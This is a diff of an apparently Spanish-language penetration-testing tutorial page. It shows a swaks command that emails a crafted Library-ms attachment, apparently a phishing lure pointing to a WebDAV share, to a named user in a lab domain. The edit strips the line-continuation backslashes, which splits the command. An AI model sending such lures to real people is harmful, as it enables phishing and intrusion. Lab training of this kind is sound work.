@@ -273,8 +273,8 @@ kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anony
                 <p>Podemos enviar este archivo como adjunto utilizando la herramienta <code>swaks</code>:</p>
 
                 <pre><code>
-sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com \
---attach @config.Library-ms --server 192.168.132.199 --body @body.txt \
+sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com 
+--attach @config.Library-ms --server 192.168.132.199 --body @body.txt 
 --header "Subject: Problem" --suppress-data -ap
                 </code></pre>
                 <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
